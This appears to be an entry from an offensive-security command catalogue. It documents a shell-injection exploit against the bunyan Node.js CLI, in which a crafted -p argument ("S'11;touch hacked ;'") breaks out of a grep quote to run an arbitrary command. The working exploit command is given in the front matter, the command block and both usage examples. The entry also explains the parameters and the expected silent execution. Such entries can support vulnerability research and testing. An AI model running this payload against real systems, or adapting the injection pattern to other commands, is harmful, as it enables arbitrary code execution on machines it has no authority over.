---
id: cmd-uuid-2
data: ./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
tags:
  - exploitation
  - rce
type: command
output: null
executor: bash
platforms:
  - Node.js
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.143Z'
verified: false
validated: true
submitted: true
---
# bunyan-pid-injection

## Command

```bash
./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
```

## Description

Executes the bunyan CLI with a malicious -p argument to inject a shell command, exploiting unsanitized input in the PID search functionality for arbitrary code execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-p` | PID search pattern option | Yes |
| `"S'11;touch hacked ;'"` | Malicious payload closing grep quote and injecting touch command | Yes |

## Examples

### Basic Usage

```bash
./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
```

### Advanced Usage

```bash
bunyan -p "S'11;touch hacked ;'"
```

## Expected Output

Error message like "bunyan: error: no matching PIDs found", but the injected 'touch hacked' executes, creating a file without explicit indication in stdout.

## Related

- [[Related Procedure|procedures/Exploit-Bunyan-PID-Search-Injection]]
